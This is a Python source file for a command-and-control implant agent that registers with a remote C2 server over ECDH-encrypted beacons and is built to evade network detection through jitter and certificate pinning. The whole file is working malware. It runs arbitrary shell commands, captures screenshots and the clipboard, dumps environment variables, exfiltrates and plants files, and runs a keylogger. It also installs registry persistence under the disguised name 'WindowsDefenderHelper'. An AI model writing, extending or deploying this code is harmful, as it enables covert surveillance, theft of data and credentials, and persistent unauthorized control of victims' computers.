"""
C2 Agent — hardened with:
  - ECDH (SECP256R1) key exchange for per-session forward secrecy
  - Per-agent session tokens replacing the shared global beacon token
  - TLS certificate pinning (SHA-256 fingerprint verification)
  - Random persistent UUID agent ID (no MAC address fingerprint)
  - AES-256-CBC + HKDF-derived session key for all beacon traffic
  - Jittered beacon interval to evade NGFW pattern detection
"""

import os
import sys
import ssl
import hashlib
import time
import random
import socket
import platform
import subprocess
import base64
import json
import uuid as _uuid
import threading

import requests
import urllib3
import config

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Agent identity (random UUID — not the MAC address) ────────────────────────

def _get_or_create_agent_id() -> str:
    """
    Read a persisted random UUID from a hidden file, or generate one on first run.
    Stores in APPDATA (Windows) / HOME (Linux/macOS) / /tmp as last resort.
    Never uses the MAC address — hardware fingerprint stays on the machine.
    """
    base    = os.environ.get('APPDATA') or os.environ.get('HOME') or '/tmp'
    id_file = os.path.join(base, '.wdhlp')
    try:
        with open(id_file, 'r') as f:
            agent_id = f.read().strip()
            if len(agent_id) == 36:
                return agent_id
    except FileNotFoundError:
        pass
    agent_id = str(_uuid.uuid4())
    try:
        with open(id_file, 'w') as f:
            f.write(agent_id)
    except OSError:
        pass
    return agent_id


AGENT_ID = _get_or_create_agent_id()


# ── Session state ──────────────────────────────────────────────────────────────

_session_key:   str = None   # HKDF-derived per-session AES key (hex)
_session_token: str = None   # per-agent bearer token issued on registration
_registered         = False


def _get_headers() -> dict:
    """Build request headers. Uses per-agent token after registration."""
    return {
        "X-Beacon-Token": _session_token or config.API_KEY,
        "X-Agent-ID":     AGENT_ID,
        "User-Agent":     config.USER_AGENT,
    }


# ── ECDH key exchange ──────────────────────────────────────────────────────────

def _ecdh_generate():
    """Generate a SECP256R1 key pair. Returns (private_key, public_key_der_hex)."""
    from cryptography.hazmat.primitives.asymmetric.ec import generate_private_key, SECP256R1
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    priv    = generate_private_key(SECP256R1())
    pub_hex = priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo).hex()
    return priv, pub_hex


def _ecdh_derive(priv, peer_pub_hex: str) -> str:
    """ECDH shared secret → HKDF-SHA256 → 32-byte AES key (64-char hex)."""
    from cryptography.hazmat.primitives.asymmetric.ec import ECDH
    from cryptography.hazmat.primitives.serialization import load_der_public_key
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    peer_pub = load_der_public_key(bytes.fromhex(peer_pub_hex))
    shared   = priv.exchange(ECDH(), peer_pub)
    return HKDF(
        algorithm=hashes.SHA256(), length=32, salt=None, info=b'c2-session-key'
    ).derive(shared).hex()


# ── AES-256-CBC transport ──────────────────────────────────────────────────────

def _encrypt_with_key(payload: dict, key_hex: str):
    """Encrypt payload with the given key. Returns (content_type, body)."""
    if not config.ENCRYPT_BEACON:
        return "application/json", json.dumps(payload).encode()
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    key = bytes.fromhex(key_hex)
    iv  = os.urandom(16)
    raw = json.dumps(payload).encode()
    pad = 16 - len(raw) % 16
    raw += bytes([pad] * pad)
    enc = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
    ct  = enc.update(raw) + enc.finalize()
    return "text/plain", base64.b64encode(iv + ct)


def _decrypt_with_key(text: str, key_hex: str) -> dict:
    """Decrypt base64(IV+CT) with the given key → dict."""
    if not config.ENCRYPT_BEACON:
        return json.loads(text)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(text.strip())
    iv, ct = raw[:16], raw[16:]
    dec = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).decryptor()
    pt  = dec.update(ct) + dec.finalize()
    return json.loads(pt[:-pt[-1]].decode())


# ── Certificate pinning ────────────────────────────────────────────────────────

def _verify_cert_fingerprint() -> bool:
    """
    Connect to the C2 server, retrieve the TLS certificate, and compare its
    SHA-256 fingerprint against the pinned value in config.CERT_FINGERPRINT.

    Returns True  — pinning disabled (placeholder) or fingerprint matches.
    Returns False — fingerprint mismatch; main() will exit silently.

    Even with verify=False on requests, the pinned fingerprint ensures the agent
    only talks to the real C2 server — MITM proxies present a different cert.
    """
    fp = getattr(config, 'CERT_FINGERPRINT', '')
    if not fp or fp == "REPLACE_WITH_gen_cert_OUTPUT":
        return True  # Dev/testing mode — pinning disabled
    try:
        from urllib.parse import urlparse
        parsed = urlparse(config.C2_SERVER)
        host   = parsed.hostname
        port   = parsed.port or 443
        pem    = ssl.get_server_certificate((host, port))
        der    = ssl.PEM_cert_to_DER_cert(pem)
        actual = hashlib.sha256(der).hexdigest()
        return actual == fp
    except Exception:
        return False


# ── Transport helpers ──────────────────────────────────────────────────────────

def _post_bootstrap(endpoint: str, payload: dict) -> dict:
    """POST using the bootstrap ENCRYPTION_KEY — registration only."""
    ct, body = _encrypt_with_key(payload, config.ENCRYPTION_KEY)
    hdrs = {**_get_headers(), "Content-Type": ct}
    r = requests.post(
        f"{config.C2_SERVER}{endpoint}", data=body, headers=hdrs, timeout=10, verify=False
    )
    return _decrypt_with_key(r.text, config.ENCRYPTION_KEY)


def _post(endpoint: str, payload: dict) -> dict:
    """POST using the per-session ECDH-derived key."""
    ct, body = _encrypt_with_key(payload, _session_key)
    hdrs = {**_get_headers(), "Content-Type": ct}
    r = requests.post(
        f"{config.C2_SERVER}{endpoint}", data=body, headers=hdrs, timeout=10, verify=False
    )
    return _decrypt_with_key(r.text, _session_key)


def _get(endpoint: str) -> dict:
    """GET using the per-session ECDH-derived key."""
    r = requests.get(
        f"{config.C2_SERVER}{endpoint}", headers=_get_headers(), timeout=10, verify=False
    )
    return _decrypt_with_key(r.text, _session_key)


# ── Jittered sleep ─────────────────────────────────────────────────────────────

def _sleep():
    """Irregular sleep interval evades NGFW/IDS pattern detection."""
    duration = max(5, config.BEACON_INTERVAL + random.randint(-config.JITTER, config.JITTER))
    time.sleep(duration)


# ── System info ────────────────────────────────────────────────────────────────

def _sysinfo() -> dict:
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "unknown"
    return {
        "agent_id":   AGENT_ID,
        "hostname":   socket.gethostname(),
        "ip":         ip,
        "os":         platform.system(),
        "os_version": platform.version(),
        "username":   os.getenv("USERNAME") or os.getenv("USER") or "unknown",
    }


# ── Command handlers ───────────────────────────────────────────────────────────

def _shell(cmd: str) -> str:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Command exceeded 30s"
    except Exception as e:
        return f"[ERROR] {e}"


def _sysinfo_str() -> str:
    info = _sysinfo()
    lines = [
        f"{'Hostname':<16}: {info['hostname']}",
        f"{'IP':<16}: {info['ip']}",
        f"{'OS':<16}: {info['os']} {info['os_version']}",
        f"{'Username':<16}: {info['username']}",
        f"{'Agent ID':<16}: {info['agent_id']}",
        f"{'Python':<16}: {sys.version.split()[0]}",
        f"{'Arch':<16}: {platform.machine()}",
        f"{'Processor':<16}: {platform.processor()[:60]}",
    ]
    return "\n".join(lines)


def _screenshot() -> str:
    try:
        from PIL import ImageGrab
        import io
        buf = io.BytesIO()
        ImageGrab.grab().save(buf, "PNG")
        return "[SCREENSHOT_B64]" + base64.b64encode(buf.getvalue()).decode()
    except ImportError:
        return "[ERROR] Pillow not installed — pip install pillow"
    except Exception as e:
        return f"[ERROR] Screenshot failed: {e}"


def _clipboard() -> str:
    if platform.system() == "Windows":
        return _shell("powershell -command Get-Clipboard")
    return _shell("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null")


def _netstat() -> str:
    if platform.system() == "Windows":
        return _shell("netstat -ano")
    return _shell("ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null")


def _arp() -> str:
    return _shell("arp -a")


def _privs() -> str:
    if platform.system() == "Windows":
        whoami  = _shell("whoami /priv")
        groups  = _shell("whoami /groups")
        is_admin = _shell('net session >nul 2>&1 && echo [ADMIN] || echo [NOT ADMIN]')
        return f"{is_admin}\n\n--- PRIVILEGES ---\n{whoami}\n\n--- GROUPS ---\n{groups}"
    else:
        return _shell("id && sudo -l 2>/dev/null")


def _ps() -> str:
    if platform.system() == "Windows":
        return _shell('tasklist /fo table /nh')
    return _shell("ps aux --sort=-%cpu | head -30")


def _env() -> str:
    return "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))


def _download(path: str) -> str:
    try:
        with open(path.strip(), "rb") as f:
            data = f.read()
        return f"[FILE_B64 path={path.strip()}]{base64.b64encode(data).decode()}"
    except FileNotFoundError:
        return f"[ERROR] File not found: {path}"
    except Exception as e:
        return f"[ERROR] {e}"


def _upload(args: str) -> str:
    parts = args.split(" ", 1)
    if len(parts) != 2:
        return "[ERROR] Usage: upload <path> <base64data>"
    path, b64 = parts
    try:
        with open(path.strip(), "wb") as f:
            f.write(base64.b64decode(b64))
        return f"[OK] {len(base64.b64decode(b64))} bytes written to {path.strip()}"
    except Exception as e:
        return f"[ERROR] {e}"


def _sleep_cmd(args: str) -> str:
    try:
        config.BEACON_INTERVAL = int(args.strip())
        return f"[OK] Beacon interval set to {config.BEACON_INTERVAL}s"
    except ValueError:
        return "[ERROR] Usage: sleep <seconds>"


# ── Keylogger ──────────────────────────────────────────────────────────────────

_klog_active = False
_klog_buffer = []
_klog_lock   = threading.Lock()


def _klog_start() -> str:
    global _klog_active, _klog_buffer
    try:
        from pynput import keyboard
    except ImportError:
        return "[ERROR] pynput not installed — pip install pynput"
    _klog_active = True
    _klog_buffer = []

    def on_press(key):
        if not _klog_active:
            return False
        with _klog_lock:
            try:
                _klog_buffer.append(key.char or "")
            except AttributeError:
                special = {
                    keyboard.Key.space:     " ",
                    keyboard.Key.enter:     "\n",
                    keyboard.Key.backspace: "[BS]",
                    keyboard.Key.tab:       "\t",
                }.get(key, f"[{key.name}]")
                _klog_buffer.append(special)

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    return "[OK] Keylogger started — use 'keylogger dump' to retrieve, 'keylogger stop' to halt"


def _klog_stop() -> str:
    global _klog_active
    _klog_active = False
    return "[OK] Keylogger stopped"


def _klog_dump() -> str:
    with _klog_lock:
        data = "".join(_klog_buffer)
        _klog_buffer.clear()
    return data if data else "(no keystrokes captured since last dump)"


# ── Persistence ────────────────────────────────────────────────────────────────

def _persist_add() -> str:
    if platform.system() != "Windows":
        return "[ERROR] Windows-only. Use crontab or systemd on Linux."
    try:
        import winreg
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        value = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
        winreg.SetValueEx(key, "WindowsDefenderHelper", 0, winreg.REG_SZ, value)
        winreg.CloseKey(key)
        return f"[OK] Persistence added\nKey : HKCU\\{reg_path}\\WindowsDefenderHelper\nValue: {value}"
    except Exception as e:
        return f"[ERROR] {e}"


def _persist_remove() -> str:
    if platform.system() != "Windows":
        return "[ERROR] Windows-only."
    try:
        import winreg
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsDefenderHelper")
        winreg.CloseKey(key)
        return "[OK] Persistence removed"
    except FileNotFoundError:
        return "[OK] Key was not present"
    except Exception as e:
        return f"[ERROR] {e}"


# ── Command dispatcher ─────────────────────────────────────────────────────────

def dispatch(command: str) -> str:
    cmd = command.strip()
    if cmd.startswith("shell "):      return _shell(cmd[6:])
    if cmd == "sysinfo":              return _sysinfo_str()
    if cmd == "screenshot":           return _screenshot()
    if cmd == "clipboard":            return _clipboard()
    if cmd == "netstat":              return _netstat()
    if cmd == "arp":                  return _arp()
    if cmd == "privs":                return _privs()
    if cmd == "ps":                   return _ps()
    if cmd == "env":                  return _env()
    if cmd.startswith("download "):   return _download(cmd[9:])
    if cmd.startswith("upload "):     return _upload(cmd[7:])
    if cmd.startswith("sleep "):      return _sleep_cmd(cmd[6:])
    if cmd == "keylogger start":      return _klog_start()
    if cmd == "keylogger stop":       return _klog_stop()
    if cmd == "keylogger dump":       return _klog_dump()
    if cmd == "persist add":          return _persist_add()
    if cmd == "persist remove":       return _persist_remove()
    if cmd == "kill":                 return "[KILL] Agent terminating."
    return _shell(cmd)


# ── Beacon loop ────────────────────────────────────────────────────────────────

def _try_register() -> bool:
    """
    ECDH registration handshake:
      1. Generate agent ECDH keypair.
      2. POST sysinfo + agent public key, encrypted with bootstrap key.
      3. Receive server public key + session token, encrypted with bootstrap key.
      4. Derive shared session key via ECDH + HKDF-SHA256.
      5. All future beacons use session_key + session_token.
    """
    global _registered, _session_key, _session_token
    try:
        agent_priv, agent_pub_hex = _ecdh_generate()
        payload = _sysinfo()
        payload['ecdh_public_key'] = agent_pub_hex
        resp = _post_bootstrap("/beacon/register", payload)
        _session_key   = _ecdh_derive(agent_priv, resp['ecdh_public_key'])
        _session_token = resp.get('session_token')
        _registered    = True
        return True
    except Exception:
        return False


def _try_beacon():
    """Single beacon cycle. Re-registers with fresh ECDH keys if session was lost."""
    global _registered
    if not _registered:
        if not _try_register():
            return
    try:
        resp    = _get("/beacon/task")
        task_id = resp.get("task_id")
        command = resp.get("command")
        if task_id and command:
            output = dispatch(command)
            _post("/beacon/result", {"task_id": task_id, "output": output})
            if command.strip() == "kill":
                sys.exit(0)
    except Exception:
        _registered = False  # Lost contact — re-register on next cycle


def main():
    # Certificate pinning check — abort silently on fingerprint mismatch
    if not _verify_cert_fingerprint():
        sys.exit(1)

    # Retry registration until server is reachable (survives server downtime)
    backoff = 5
    while not _try_register():
        time.sleep(backoff + random.uniform(0, 3))
        backoff = min(backoff * 2, 60)

    while True:
        try:
            _try_beacon()
        except Exception:
            pass
        _sleep()


if __name__ == "__main__":
    main()
